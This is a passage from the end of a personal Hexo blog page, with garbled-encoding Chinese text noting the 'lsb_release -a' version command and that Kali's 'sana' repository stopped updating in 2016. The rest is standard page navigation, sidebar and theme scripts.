â­æŸ¥çœ‹ç‰ˆæœ¬å·ï¼Œä»£ç å·
lsb_release -a</code></pre></blockquote>
<ul>
<li>Kali sanaåº“äº2016å¹´4æœˆ15æ—¥åœæ­¢æ›´æ–°</li>
<li>å·¥å…·æœ‰æ‰€æ›´æ–°</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/">Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">75</span>
                  <span class="site-state-item-name">æ—¥å¿—</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">åˆ†ç±»</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">æ ‡ç­¾</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:643008933@qq.com" target="_blank" title="QQé‚®ç®±">
                      
                        <i class="fa fa-fw fa-envelope"></i>QQé‚®ç®±</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
</div>


  <div class="powered-by">ç”± <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> å¼ºåŠ›é©±åŠ¨</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">ä¸»é¢˜ &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
